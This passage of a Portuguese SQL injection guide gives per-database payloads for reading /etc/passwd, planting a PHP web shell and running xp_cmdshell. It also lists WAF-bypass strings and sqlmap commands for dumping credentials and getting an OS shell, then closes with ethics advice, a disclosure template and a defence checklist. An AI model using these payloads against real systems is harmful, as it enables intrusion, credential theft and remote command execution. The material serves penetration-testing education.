LOAD_FILE('/etc/passwd')

-- Shell
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/shell.php'
```

#### PostgreSQL
```sql
-- Version
SELECT version()

-- User
SELECT current_user

-- Database
SELECT current_database()

-- Tables
SELECT tablename FROM pg_tables

-- File Read
SELECT pg_read_file('/etc/passwd')

-- Shell
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/shell.php'
```

#### SQL Server
```sql
-- Version
@@version

-- User
SYSTEM_USER
SUSER_NAME()

-- Database
DB_NAME()

-- Tables
SELECT name FROM sysobjects WHERE xtype='U'

-- Shell
EXEC xp_cmdshell 'whoami'
```

### WAF Bypass Techniques
```sql
-- Case Variation
' Or 1=1 --
' oR 1=1 --

-- URL Encoding
%27%20OR%201%3D1%20--

-- Double URL Encoding
%2527%2520OR%25201%253D1%2520--

-- Unicode
%u0027%20OR%201=1 --

-- SQL Comments
'/**/OR/**/1=1--
'/*!50000OR*/1=1--

-- Whitespace Alternatives
'%09OR%091=1--
'%0AOR%0A1=1--
'%0COR%0C1=1--
'%0DOR%0D1=1--
```

### SQLMap Cheat Sheet
```bash
# Básico
sqlmap -u "http://site.com/page?id=1"

# POST request
sqlmap -u "http://site.com/login" --data="user=admin&pass=test"

# Com cookie
sqlmap -u "http://site.com/page" --cookie="PHPSESSID=abc123"

# Enumeração
sqlmap -u "http://site.com/page?id=1" --dbs
sqlmap -u "http://site.com/page?id=1" -D dbname --tables
sqlmap -u "http://site.com/page?id=1" -D dbname -T users --columns
sqlmap -u "http://site.com/page?id=1" -D dbname -T users -C username,password --dump

# Técnicas
sqlmap -u "http://site.com/page?id=1" --technique=BEUST
sqlmap -u "http://site.com/page?id=1" --technique=T --time-sec=5

# OS Interaction
sqlmap -u "http://site.com/page?id=1" --os-shell
sqlmap -u "http://site.com/page?id=1" --os-cmd="whoami"

# Bypass WAF
sqlmap -u "http://site.com/page?id=1" --tamper=space2comment,between
```

### Ferramentas Recomendadas
```
1. SQLMap - Exploração automática
2. Burp Suite - Interceptação e testing
3. OWASP ZAP - Scanner de vulnerabilidades
4. NoSQLMap - Para bancos NoSQL
5. Havij - GUI para SQLi (Windows)
6. jSQL Injection - GUI Java-based
7. BBQSQL - Blind SQLi automation
```

---

## ⚖️ ASPECTOS LEGAIS E ÉTICOS

### Uso Ético
1. **SEMPRE obtenha permissão por escrito** antes de testar
2. **Use apenas em sistemas próprios** ou com autorização explícita
3. **Reporte vulnerabilidades** de forma responsável
4. **Não cause danos** ou interrupções
5. **Proteja dados descobertos** - não divulgue informações sensíveis

### Programas de Bug Bounty
```
- HackerOne
- Bugcrowd
- Synack
- Open Bug Bounty
- Programas próprios de empresas (Google, Microsoft, etc.)
```

### Report Responsável
```markdown
# Template de Report de Vulnerabilidade

**Título**: SQL Injection em [URL]

**Severidade**: Crítica/Alta/Média/Baixa

**Descrição**:
Parâmetro vulnerável: [parâmetro]
URL afetada: [URL completa]
Tipo de SQLi: [Union/Error/Blind/Out-of-band]

**Passos para reproduzir**:
1. Acesse [URL]
2. Adicione payload [payload] no parâmetro [parâmetro]
3. Observe [resultado]

**Evidências**:
[Screenshots/logs/capturas]

**Impacto**:
[O que pode ser feito com a vulnerabilidade]

**Recomendações**:
[Como corrigir]

**Informações de contato**:
[Seu email/GPG key]
```

---

## 📚 RECURSOS PARA APRENDIZAGEM

### Livros Recomendados
1. "The Web Application Hacker's Handbook" - Dafydd Stuttard & Marcus Pinto
2. "SQL Injection Attacks and Defense" - Justin Clarke
3. "The Database Hacker's Handbook" - David Litchfield et al.
4. "Black Hat Python" - Justin Seitz

### Cursos Online
1. PortSwigger Web Security Academy (grátis)
2. OWASP Top 10
3. PentesterLab SQLi Pro
4. SANS SEC542: Web App Penetration Testing

### Sites de Prática
1. PortSwigger Labs
2. PentesterLab
3. HackTheBox
4. TryHackMe
5. VulnHub
6. OverTheWire

### Comunidades
1. OWASP (Open Web Application Security Project)
2. Reddit: /r/netsec, /r/AskNetsec
3. Discord: HackTheBox, TryHackMe
4. Twitter: @sqlmap, @owasp

---

## 🎯 CONCLUSÃO

SQL Injection continua sendo uma das vulnerabilidades mais críticas e comuns na web, apesar de ser conhecida há décadas. Dominar tanto a exploração quanto a prevenção é essencial para:

**Para Desenvolvedores**:
- Implementar práticas seguras de codificação
- Entender como os ataques funcionam para melhor prevenir
- Realizar testes regulares de segurança

**Para Pentesters**:
- Identificar e explorar vulnerabilidades
- Demonstrar impacto real para clientes
- Recomendar correções adequadas

**Para Administradores**:
- Implementar controles de segurança em camadas
- Monitorar tentativas de ataque
- Manter sistemas atualizados

### Regra de Ouro
> "Nunca confie na entrada do usuário. Sempre valide, sanitize e use prepared statements."

### Checklist de Segurança
- [ ] Usar prepared statements/parameterized queries
- [ ] Implementar princípio do menor privilégio
- [ ] Validar e sanitizar todas as entradas
- [ ] Usar ORM quando possível
- [ ] Implementar WAF
- [ ] Logar e monitorar tentativas
- [ ] Realizar testes regulares de penetração
- [ ] Manter software atualizado
- [ ] Educar desenvolvedores sobre segurança
- [ ] Ter plano de resposta a incidentes

### Última Palavra
SQL Injection é uma batalha constante entre atacantes e defensores. Enquanto os atacantes desenvolvem novas técnicas de evasão, os defensores devem estar sempre um passo à frente, implementando múltiplas camadas de defesa e mantendo-se atualizados sobre as últimas ameaças e contramedidas.

Lembre-se: **Segurança não é um produto, é um processo contínuo.**
